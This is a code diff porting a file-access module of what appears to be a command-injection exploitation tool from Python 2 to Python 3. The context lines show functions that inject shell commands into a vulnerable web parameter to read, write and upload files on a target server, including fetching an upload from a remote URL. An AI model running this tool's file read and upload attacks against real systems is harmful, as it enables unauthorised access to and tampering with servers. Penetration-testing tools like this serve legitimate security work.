@@ -16,7 +16,7 @@ For more see the file 'readme/COPYING' for copying permission.
 import re
 import os
 import sys
-import urllib2
+
 
 from src.utils import menu
 from src.utils import settings
@@ -53,15 +53,15 @@ def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
     shell = "".join(str(p) for p in shell)
   except TypeError:
     pass
-  if settings.VERBOSITY_LEVEL <= 1 and not menu.options.ignore_session and _:
-    print ""
+  if settings.VERBOSITY_LEVEL <= 1 and _:
+    print("")
   if shell:
     success_msg = "The contents of file '"  
     success_msg += file_to_read + Style.RESET_ALL + Style.BRIGHT 
     success_msg += "'" + Style.RESET_ALL + " : "
     sys.stdout.write(settings.print_success_msg(success_msg))
     sys.stdout.flush()
-    print shell
+    print(shell)
     output_file = open(filename, "a")
     success_msg = "The contents of file '"
     success_msg += file_to_read + "' : " + shell + ".\n"
@@ -143,15 +143,15 @@ def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec,
     shell = "".join(str(p) for p in shell)
     # Check if file exists
     cmd = "echo $(ls " + dest_to_write + ")"
-  print ""
+  print("")
   check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
   shell = output 
   try:
     shell = "".join(str(p) for p in shell)
   except TypeError:
     pass
-  if settings.VERBOSITY_LEVEL <= 1 and not menu.options.ignore_session and _:
-    print ""
+  if settings.VERBOSITY_LEVEL <= 1 and _:
+    print("")
   if shell:
     success_msg = "The '" +  shell + Style.RESET_ALL 
     success_msg += Style.BRIGHT + "' file was created successfully!\n" 
@@ -174,13 +174,13 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec
     file_to_upload = menu.options.file_upload
     # check if remote file exists.
     try:
-      urllib2.urlopen(file_to_upload)
-    except urllib2.HTTPError, err_msg:
+      _urllib.request.urlopen(file_to_upload)
+    except _urllib.error.HTTPError as err_msg:
       warn_msg = "It seems that the '" + file_to_upload + "' file, does not exist. (" +str(err_msg)+ ")"
       sys.stdout.write("\n" + settings.print_warning_msg(warn_msg) + "\n")
       sys.stdout.flush()
       raise SystemExit()
-    except ValueError, err_msg:
+    except ValueError as err_msg:
       err_msg = str(err_msg[0]).capitalize() + str(err_msg)[1]
       sys.stdout.write(settings.print_critical_msg(err_msg) + "\n")
       sys.stdout.flush()
@@ -202,15 +202,15 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec
       cmd = "dir " + dest_to_upload + ")"
     else:  
       cmd = "echo $(ls " + dest_to_upload + ")"
-    print ""  
+    print("")  
     check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
     shell = output 
     try:
       shell = "".join(str(p) for p in shell)
     except TypeError:
       pass
-    if settings.VERBOSITY_LEVEL <= 1 and not menu.options.ignore_session and _:
-      print ""
+    if settings.VERBOSITY_LEVEL <= 1 and _:
+      print("")
     if shell:
       success_msg = "The '" +  shell + Style.RESET_ALL 
       success_msg += Style.BRIGHT + "' file was uploaded successfully!"
